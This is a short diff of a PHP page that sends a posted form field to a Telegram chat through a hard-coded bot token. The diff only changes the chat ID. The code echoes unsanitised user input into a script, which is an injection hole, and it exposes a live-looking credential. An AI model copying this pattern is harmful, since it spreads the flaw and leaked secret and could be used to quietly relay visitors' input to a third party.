@@ -4,7 +4,7 @@
 #https://api.telegram.org/bot1069781985:AAGSkPcrfK52v3AK1ZP_znDVh6NxSviB1VA/sendMessage?chat_id=-353093420&text=Omega+LUL
 if(isset($_POST['button'])){
     $first = $_POST['first'];
-    echo "<script language='JavaScript' type='text/javascript'>fetch('https://api.telegram.org/bot1069781985:AAGSkPcrfK52v3AK1ZP_znDVh6NxSviB1VA/sendMessage?chat_id=-353093420&text=$first')</script>";
+    echo "<script language='JavaScript' type='text/javascript'>fetch('https://api.telegram.org/bot1069781985:AAGSkPcrfK52v3AK1ZP_znDVh6NxSviB1VA/sendMessage?chat_id=-1001426249258&text=$first')</script>";
 } 
 ?>
 <!DOCTYPE html>
